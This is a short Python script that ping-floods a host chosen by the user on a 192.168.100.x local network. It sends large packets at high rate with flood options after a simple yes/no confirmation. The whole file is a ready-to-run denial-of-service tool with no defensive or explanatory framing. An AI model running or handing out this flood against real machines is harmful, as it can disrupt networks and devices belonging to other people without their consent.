# Import statements
import subprocess
import sys
import signal

# Functions
def sigint_handler(signal, frame):
    print("\n",'KeyboardInterrupt was caught, exiting script gracefully')
    sys.exit(0)



# Main script
ip = input("enter last 3 numbers of local IP to flood: ")

ipToFlood = str(f"192.168.100.{ip}")

confirmation = input(f"are you sure {ipToFlood} is the right IP? ")

if confirmation != "yes":
    sys.exit("Aborting")
else:
    print("Continuing")

print(f"Flooding {ipToFlood}...")

signal.signal(signal.SIGINT, sigint_handler)
subprocess.run(["ping", ipToFlood, "-t 1", "-i .01", "-l 3", "-f", "-W 0", "-s 60000"])




